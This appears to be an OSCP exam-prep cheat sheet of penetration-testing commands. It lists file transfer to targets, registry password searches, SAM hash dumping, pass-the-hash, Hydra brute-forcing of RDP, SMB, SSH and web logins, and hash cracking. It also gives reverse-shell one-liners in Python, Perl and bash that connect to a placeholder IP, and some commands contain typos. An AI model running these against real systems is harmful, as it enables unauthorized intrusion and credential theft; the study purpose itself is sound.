∂# OSCP-handytools
- https://github.com/seal9055/oscp-notes/blob/main/README.md
- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/tree/main
- https://github.com/Ak500k/oscp-notes?tab=readme-ov-file
- https://zweilosec.github.io/posts/upgrade-linux-shell/
  
# Wordlists
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
```

# Post Exploitation Linux
## File upload
- Starting Web Server
`python3 -m http.server 80`

- Filetransfer
```
wget <LHOST>/<file>
curl http://<LHOST>/<file> -o <output-file>
echo "GET /<file> HTTP/1.0" | nc -n <LHOST> 80 > <out-file> && sed -i '1,7d' <out-file>
```

- Secure Filetransfers
```
on target:  ncat -nvlp <port> --ssl > <out-file>
on kali:  ncat -nv <RHOST> <RPORT> --ssl < <file-to-send>
```

# Passwords
- Use chisel to remotely forward port 445, and use winexe to log in
`winexe -U <user>%<password> //<RHOST> cmd.exe`

- Check for passwords
`reg query HKLM /f password /t REG_SZ /s`
`reg query HKCU /f password /t REG_SZ /s`

- Weak Permissions on Sam Files
`python2 pwdump.py <SYSTEMFILE> <SAMFILE>`

- Cracking the password
`hashcat -m 1000 --force <hash> <wordlist>`

- PTH
`pth-winexe -U '<entire-hash>' //<RHOST> cmd.exe`


# Password Spraying
- Create Password List
`crunchy <length> <length> -t <pw-core>%%%% `

- Spray
`rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`

# Hashcracking
- John
`john --format=<fomrat> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

- Hashcat
```
hashcat -m <hashid> -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt -O  
hashcat -m <hashid> -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt -O -r /usr/share/hashcat/rules/best64.rule  
cat pw | hashcat -r/usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
```

# Bruteforcing
RDP Brute Force - Hydra
`hydra -L /usr/share/wordlists/rockyou.txt t -p "<password" rdp://<IP>`

SMB Brute Force - Hydra
`hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt <IP> smb`

SSH Brute Force - Hydra
`hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>`

HTTP POST Login Form (login forms) Brute Force - Hydra, brute force username and password
`hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:usernamefieldname=^USER^&passwordfieldname=^PASS^:Login failed text" -vV -f`

HTTP POST Login Form (login forms) Brute Force - Hydra, bruteforce password only
`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -1 admin -P /usr/share/wordlists/rockyou. txt -vV -f`
![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/a78ffd2d-a33b-4f53-8574-9b6a4a7f4c40)

HTTP GET Login Form Brute Force - Hydra
`hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login`

# MISC
SSH Encrypted
`/usr/share/john/ssh2john`

Crack Zip Pw
`fcrackzip -uvDp /usr/share/wordlists/rockyou.txt file.zip`

Tcp Dump
`sudo tcpdump -i tun0 icmp`

Images
- `binwalk <image>`
- `binwalk -Me <image>`

# Upgrade Linux Shell
check python version used in box
`which python python2 python3`

Method 1: using Python
- `python -c 'import pty;pty.spawn("/bin/bash")'`
- `python3- c 'import pty;pty.spawn("/bin/sh")'`
- `stty raw -echo`

Method 2: Using Script
- `script -qc /bin/bash /dev/nullscript -qc /bin/bash /dev/null`

## references
## upgrade shell
- https://fareedfauzi.gitbook.io/oscp-playbook/reverse-shell/interactive-ttys-shell
- https://github.com/pythonmaster41/Go-For-OSCP
- https://www.schtech.co.uk/linux-reverse-shell-without-python/
- https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet

```bash
#Python
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

#non python shell (not 100%)
#This will break you out of the pseudo terminal and into a tty shell, you can then su and carry out all other terminal based commands
/usr/bin/script -qc /bin/bash /dev/null
stty raw -echo; fg; reset

#Bash
echo os.system('/bin/bash')
/bin/sh -i
exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done

#Perl
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#Ruby:
ruby: exec "/bin/sh"

#Lua
lua: os.execute('/bin/sh')

#From within IRB
exec "/bin/sh"

#From within vi
:!bash

#From within vi
:set shell=/bin/bash:shell

#From within nmap
!sh
```

# Upgrade Windows Shell
`rlwrap nc -lvnp $port`

# improve presentation of shell i.e. browse command history
`rlwrap nc -lvnp $port`

# Tools to make life easier
-> revshell generator
https://www.revshells.com/ 

-> CyberChef
https://gchq.github.io/CyberChef/

-> urlencoder
https://www.urlencoder.org/

-> octal
http://www.unit-conversion.info/texttools/octal/

-> hex
http://www.unit-conversion.info/texttools/octal/

-> IP converter
https://www.silisoftware.com/tools/ipconverter.php

-> How to Zip and Unzip Files Using PowerShell
https://zweilosec.github.io/posts/zip-unzip-files-powershell/ 
